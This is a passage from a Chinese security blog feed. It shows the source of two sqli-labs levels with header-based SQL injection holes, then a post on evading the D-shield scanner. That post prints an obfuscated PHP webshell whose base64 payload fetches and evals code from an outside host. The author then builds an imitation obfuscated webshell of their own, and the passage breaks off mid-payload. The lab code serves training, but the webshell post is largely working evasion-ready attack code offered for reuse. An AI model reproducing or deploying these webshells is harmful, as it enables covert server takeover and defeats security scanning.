class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-18 Header Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;</span><br><span class="line">&lt;div  align=&quot;center&quot; style=&quot;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&quot;&gt;</span><br><span class="line">&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!--Form to post the contents --&gt;</span><br><span class="line">&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;div&gt; Password : &amp;nbsp; &amp;nbsp;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value)) /*判断变量值是否为空*/</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,20); /*从0的位置开始读取，长度为20*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())  /*返回当前 magic_quotes_gpc 配置选项的设置,为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &apos; (单引号)、&quot; (双引号)、\（反斜杠）和 NUL&apos;s 被一个反斜杠自动转义。*/</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value); /*去除单个反斜线，如果有两个反斜线则被替换为一个反斜线*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value)) /*纯数字检测*/</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value); /*取整数的值*/</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; /*获取来访者的user-agent*/</span><br><span class="line">$IP = $_SERVER[&apos;REMOTE_ADDR&apos;]; /*浏览当前页面用户的IP*/</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your IP ADDRESS is: &apos; .$IP;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo &apos;Your User Agent is: &apos; .$uagent;</span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*判断变量不为空并且值不为NULL*/</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">$uname = check_input($_POST[&apos;uname&apos;]); /*检测uname*/</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]); /*检测passwd*/</span><br><span class="line"></span><br><span class="line">echo &apos;Your Your User name:&apos;. $uname;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your Password:&apos;. $passwd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your User Agent String:&apos;. $uagent;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your User Agent String:&apos;. $IP;</span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;User Agent:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">if($row1)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; /*向数据库插入数据，记录user-agent,IP，uname*/</span><br><span class="line">mysql_query($insert);</span><br><span class="line">echo &apos;Your IP ADDRESS is: &apos; .$IP;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;;</span><br><span class="line">echo &apos;Your User Agent is: &apos; .$uagent;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">//echo &quot;Try again looser&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>对uname和passwd做了严格的过滤，但是由于将浏览当前页面的IP，user-agent插入数据库中，user-agent头没有做好对应的过滤，引发注入</p><p><img src="https://s2.ax1x.com/2019/01/14/FxUwAP.png" alt="FxUwAP.png"></p><p><img src="https://s2.ax1x.com/2019/01/14/FxUBh8.png" alt="FxUBh8.png"></p><p>第十九关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-19 Header Injection- Referer- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;</span><br><span class="line">&lt;div  align=&quot;center&quot; style=&quot;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&quot;&gt;</span><br><span class="line">&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!--Form to post the contents --&gt;</span><br><span class="line">&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;div&gt; Password : &amp;nbsp; &amp;nbsp;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value)) /*判断变量的值是否为空*/</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,20); /*从0的位置开始读取，长度为20*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value); /*返回当前 magic_quotes_gpc 配置选项的设置,为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &apos; (单引号)、&quot; (双引号)、\（反斜杠）和 NUL&apos;s 被一个反斜杠自动转义。*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value)) /*检测字符串是否为数字*/</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$uagent = $_SERVER[&apos;HTTP_REFERER&apos;]; /*获取浏览器当前页面的referer头*/</span><br><span class="line">$IP = $_SERVER[&apos;REMOTE_ADDR&apos;]; /*获取浏览当前页面的IP*/</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your IP ADDRESS is: &apos; .$IP;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//echo &apos;Your User Agent is: &apos; .$uagent;</span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*检查变量是否不为空而且不是null*/</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">$uname = check_input($_POST[&apos;uname&apos;]); /*调用check_input函数检查*/</span><br><span class="line">$passwd = check_input($_POST[&apos;passwd&apos;]); /*调用check_input函数检查*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">echo &apos;Your Your User name:&apos;. $uname;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your Password:&apos;. $passwd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your User Agent String:&apos;. $uagent;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;Your User Agent String:&apos;. $IP;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;Referer:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">if($row1)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;; /*将数据插入数据库，引发注入*/</span><br><span class="line">mysql_query($insert);</span><br><span class="line">//echo &apos;Your IP ADDRESS is: &apos; .$IP;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;;</span><br><span class="line">echo &apos;Your Referer is: &apos; .$uagent;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">//echo &quot;Try again looser&quot;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&apos;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>对uname和passwd做了严格的过滤，没对要插入数据库的referer做过滤，导致注入</p><p><img src="https://s2.ax1x.com/2019/01/14/FxUr9S.md.png" alt="FxUr9S.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass D shield</title>
      <link href="/posts/cde0d7e7.html"/>
      <url>/posts/cde0d7e7.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天学了bypass D盾的一些知识，现在总一个总结。<br><img src="http://p3.pstatp.com/large/6159000260c5ea3ec1a4" alt="6159000260c5ea3ec1a4"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们来看一个大马，来自t00ls的大马。这个大马比较有趣</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//密码 Silic </span><br><span class="line">//base64解密自己修改远程读取 或者其他</span><br><span class="line">function MonkeySun()&#123;</span><br><span class="line">    return str_replace(&quot;两开花&quot;, &quot;&quot;, &quot;两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN&quot;); /*两开花替换为空*/</span><br><span class="line">&#125;</span><br><span class="line">$s=&quot;__JHMgPS__说到大马，我就想起了西游记里的白龙马。__B0cmlt__中美合拍的西游记即将正式开机，我继续扮演美猴王孙悟空__KHN1YnN0__我会用美猴王艺术形象努力创造一个正能量的形象__cihmaWx&quot;;</span><br><span class="line">$k=&quot;lX2dldF9jb__文体两开花，弘扬中华文化，希望大家能多多关注__250ZW50cygiaHR0cDovL3BqcnhuNjI4dy5ia3QuY2xvdWRkbi5jb20vZnVjay5naWYiKSwxOTA3MSkpOwpldmFsKCRzKTs=&quot;;</span><br><span class="line">$cre =MonkeySun();</span><br><span class="line">$str = strrev(&apos;EcAlpEr_RtS&apos;); /*反转字符串 str_replace()*/</span><br><span class="line">$ba64 = strrev(&apos;eDoCEd_46EsAb&apos;); /*反转字符串 base64_decode() */</span><br><span class="line">$ojbk=$cre(&apos;&apos;, $ba64($str(&quot;章口就莱&quot;, &quot;&quot;, $s.$k)));</span><br><span class="line">$ojbk();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个大马成功过了D盾，而且思路还骚的一批。先打乱各种函数和webshell的payload，然后通过文字符串替换和字符串反转，实现eval()解码base64编码的webshell</p><p><img src="https://s2.ax1x.com/2019/01/13/FxC3D0.png" alt="FxC3D0.png"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxC5rt.png" alt="FxC5rt.png"></p><p>然后得到的思路是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.扰乱原来的函数</span><br><span class="line">2.在eval中重组</span><br></pre></td></tr></table></figure><p>模仿的一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function gg()&#123;</span><br><span class="line">    return str_replace(&quot;两开花&quot;, &quot;&quot;, &quot;两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN&quot;); /*两开花替换为空后，create_function()这个函数拼接了起来，函数的使用方法参考：http://php.net/manual/en/function.create-function.php*/</span><br><span class="line">&#125;</span><br><span class="line">$a=&quot;J卢本伟牛逼H卢本伟牛逼B卢本伟牛逼h卢本伟牛逼c卢本伟牛逼3卢本伟牛逼N卢本伟牛逼3卢本伟牛逼b卢本伟牛逼3卢本伟牛逼J卢本伟牛逼k卢本伟牛逼P卢本伟牛逼S卢本伟牛逼d卢本伟牛逼k卢本伟牛逼b卢本伟牛逼n卢本伟牛逼h卢本伟牛逼z卢本伟牛逼J卢本伟牛逼z卢本伟牛逼s卢本伟牛逼v卢本伟牛逼L卢本伟牛逼+卢本伟牛逼e卢本伟牛逼Z卢本伟牛逼u卢本伟牛逼+卢本伟牛逼W卢本伟牛逼9卢本伟牛逼l卢本伟牛逼e卢本伟牛逼W卢本伟牛逼v卢本伟牛逼h卢本伟牛逼u卢本伟牛逼e卢本伟牛逼g卢本伟牛逼g卢本伟牛逼S卢本伟牛逼j卢本伟牛逼m卢本伟牛逼l卢本伟牛逼K卢本伟牛逼/卢本伟牛逼m卢本伟牛逼j卢本伟牛逼I卢本伟牛逼H卢本伟牛逼o卢本伟牛逼j卢本伟牛逼5卢本伟牛逼z卢本伟牛逼l卢本伟牛逼i卢本伟牛逼I卢本伟牛逼A卢本伟牛逼p卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼v卢本伟牛逼L卢本伟牛逼y卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼3卢本伟牛逼l卢本伟牛逼i卢本伟牛逼p卢本伟牛逼/卢本伟牛逼o卢本伟牛逼g卢本伟牛逼7卢本伟牛逼3卢本伟牛逼n卢本伟牛逼q卢本伟牛逼I卢本伟牛逼v卢本伟牛逼l卢本伟牛逼u卢本伟牛逼o卢本伟牛逼8卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼t卢本伟牛逼L卢本伟牛逼S卢本伟牛逼0卢本伟牛逼v卢本伟牛逼L卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼9卢本伟牛逼I卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼I卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼p卢本伟牛逼z卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼N卢本伟牛逼z卢本伟牛逼a卢本伟牛逼W卢本伟牛逼9卢本伟牛逼u卢本伟牛逼X卢本伟牛逼3卢本伟牛逼N卢本伟牛逼0卢本伟牛逼Y卢本伟牛逼X卢本伟牛逼J卢本伟牛逼0卢本伟牛逼K卢本伟牛逼C卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼p卢本伟牛逼p卢本伟牛逼Z卢本伟牛逼i卢本伟牛逼h卢本伟牛逼l卢本伟牛逼b卢本伟牛逼X卢本伟牛逼B卢本伟牛逼0卢本伟牛逼e卢本伟牛逼S卢本伟牛逼g卢本伟牛逼k卢本伟牛逼X卢本伟牛逼1卢本伟牛逼N卢本伟牛逼F卢本伟牛逼U卢本伟牛逼1卢本伟牛逼N卢本伟牛逼J卢本伟牛逼T卢本伟牛逼0卢本伟牛逼5卢本伟牛逼b卢本伟牛逼J卢本伟牛逼1卢本伟牛逼B卢本伟牛逼o卢本伟牛逼c卢本伟牛逼E卢本伟牛逼N卢本伟牛逼v卢本伟牛逼Z卢本伟牛逼G卢本伟牛逼U卢本伟牛逼n卢本伟牛逼X卢本伟牛逼S卢本伟牛逼k卢本伟牛逼p卢本伟牛逼e卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼y卢本伟牛逼b卢本伟牛逼D卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼Q卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼2卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼I卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼U卢本伟牛逼4卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼0卢本伟牛逼N卢本伟牛逼y卢本伟牛逼k卢本伟